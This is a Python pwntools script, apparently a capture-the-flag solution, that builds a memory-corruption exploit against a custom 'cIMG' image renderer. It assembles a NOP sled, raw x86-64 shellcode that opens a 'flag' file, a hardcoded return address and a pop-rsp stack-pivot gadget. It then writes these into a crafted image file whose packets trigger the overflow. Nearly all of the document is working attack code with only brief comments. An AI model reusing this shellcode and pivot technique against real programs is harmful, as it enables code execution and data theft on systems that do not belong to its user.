from pwn import *

context.arch = 'amd64'

# --- CONFIGURATION ---
OFFSET = 168
ADDR = 0x7fffffffdc96 #0x7fffffffd336 #0x7fffffffcef6 #0x7fffffffcb96
HEAP = 0x414d7e
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05"
POP_RSP_RET = 0x4013ac

# --- PAYLOAD ---
payload_blob = b"\x90" * (OFFSET - len(shellcode) - 16 - 8)
payload_blob += p64(ADDR)
payload_blob += shellcode
payload_blob += b"\x90" * 16
payload_blob += p64(POP_RSP_RET)
payload_blob += p64(HEAP)

total_size = len(payload_blob)

print(f"[*] Payload Size: {total_size}")
if total_size > 250:
    print("[!] Payload too large (max 250).")
    exit()

# --- GENERATE FILES ---
with open("payload.bin", "wb") as f:
    f.write(payload_blob)

# HEADER:
# Width = 250 (CRITICAL: Must be > total_size to prevent wrapping)
# Height = 10
cimg = b"cIMG" + p16(4) + p8(250) + p8(10) + p32(3)

# --- PACKET 1: LOAD (Opcode 5) ---
cimg += p16(5)
cimg += p8(0)              # ID
# FIX: Byte 1 is Width (Offset 25). Byte 2 is Height (Offset 24).
# We want a Horizontal Sprite (Width=Total, Height=1).
cimg += p8(total_size)     # Byte 1 -> Width
cimg += p8(1)              # Byte 2 -> Height
fname = b"payload.bin"
cimg += fname + b"\x00" + b"\x00" * (258 - 3 - len(fname) - 1)

# --- PACKET 2: RENDER (Opcode 4) ---
cimg += p16(4) + p8(0) + p8(0) + p8(0) + p8(0) + p8(0) + p8(0) 
cimg += p8(1)              # Repeat X (Once)
cimg += p8(1)              # Repeat Y (Once)
cimg += p8(0xFF)           # Skip char

# --- PACKET 3: TRIGGER (Opcode 1337) ---
# Read the full horizontal line
cimg += p16(1337) + p8(0) + p8(0) + p8(0) + p8(total_size) + p8(1) + p16(0)

with open("exploit.cimg", "wb") as f:
    f.write(cimg)

print("[+] Exploit Generated.")
print("[*] Canvas Width 250 prevents wrapping.")
print("[*] Sprite is Horizontal (Total x 1).")
